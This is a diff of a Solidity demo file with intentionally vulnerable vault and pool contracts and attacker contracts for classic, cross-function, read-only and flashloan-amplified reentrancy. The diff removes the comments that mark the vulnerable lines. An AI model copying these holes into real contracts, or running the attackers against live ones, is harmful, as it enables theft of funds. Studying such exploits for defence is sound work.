@@ -1,9 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
-// ==========================================
-// 1. CLASSIC REENTRANCY
-// ==========================================
+// CLASSIC REENTRANCY
 contract ClassicVault {
     mapping(address => uint) public balances;
     function deposit() external payable { balances[msg.sender] += msg.value; }
@@ -12,7 +10,7 @@ contract ClassicVault {
         require(bal > 0, "No balance");
         (bool s, ) = msg.sender.call{value: bal}("");
         require(s, "Failed");
-        balances[msg.sender] = 0; // VULNERABLE
+        balances[msg.sender] = 0;
     }
 }
 contract ClassicAttacker {
@@ -27,9 +25,7 @@ contract ClassicAttacker {
     }
 }
 
-// ==========================================
-// 2. CROSS-FUNCTION REENTRANCY
-// ==========================================
+// CROSS-FUNCTION REENTRANCY
 contract CrossVault {
     mapping(address => uint) public balances;
     mapping(address => bool) public rewardsClaimed;
@@ -37,9 +33,9 @@ contract CrossVault {
     function claimReward() external {
         require(balances[msg.sender] > 0, "No stake");
         require(!rewardsClaimed[msg.sender], "Claimed");
-        (bool s, ) = msg.sender.call{value: 1 ether}(""); // Reward
+        (bool s, ) = msg.sender.call{value: 1 ether}("");
         require(s, "Failed");
-        rewardsClaimed[msg.sender] = true; // VULNERABLE
+        rewardsClaimed[msg.sender] = true;
     }
 }
 contract CrossAttacker {
@@ -54,9 +50,7 @@ contract CrossAttacker {
     }
 }
 
-// ==========================================
-// 3. READ-ONLY REENTRANCY (Oracle Manipulator)
-// ==========================================
+// READ-ONLY REENTRANCY (Oracle Manipulator)
 contract ReadOnlyPool {
     mapping(address => uint) public balances;
     uint public totalDeposits;
@@ -68,12 +62,12 @@ contract ReadOnlyPool {
         uint bal = balances[msg.sender];
         (bool s, ) = msg.sender.call{value: bal}("");
         require(s, "Failed");
-        balances[msg.sender] = 0; // VULNERABLE
+        balances[msg.sender] = 0;
         totalDeposits -= bal;
     }
     function getPrice() external view returns (uint) {
         if (totalDeposits == 0) return 1e18;
-        return (address(this).balance * 1e18) / totalDeposits; // Manipulatable
+        return (address(this).balance * 1e18) / totalDeposits;
     }
 }
 contract InnocentProtocol {
@@ -93,7 +87,6 @@ contract ReadOnlyAttacker {
         victim = InnocentProtocol(_v);
     }
     receive() external payable {
-        // Pool balance is 0, but totalDeposits is still high! Price is crushed.
         victim.buyTokens{value: 1 ether}();
     }
     function attack() external payable {
@@ -102,15 +95,12 @@ contract ReadOnlyAttacker {
     }
 }
 
-// ==========================================
-// 4. FLASHLOAN AMPLIFIED (Mock)
-// ==========================================
+// FLASHLOAN AMPLIFIED (Mock)
 contract MockFlashloan {
     function flashLoan(address receiver, uint amount) external {
         require(address(this).balance >= amount, "Not enough liquidity");
         (bool s, ) = receiver.call{value: amount}("");
         require(s, "Loan failed");
-        // Assume repayment check happens here in reality
     }
 
     receive() external payable {}
@@ -126,14 +116,11 @@ contract FlashAttacker {
     }
     receive() external payable {
         if (msg.sender == address(flash)) {
-            // Received Flashloan -> Track the amount
             loanAmount = msg.value;
             vault.deposit{value: msg.value}();
             vault.withdraw();
-            // Repay ONLY the borrowed amount, keep the profit!
             payable(address(flash)).transfer(loanAmount);
         } else if (msg.sender == address(vault) && address(vault).balance > 0) {
-            // Reentrancy loop
             vault.withdraw();
         }
     }
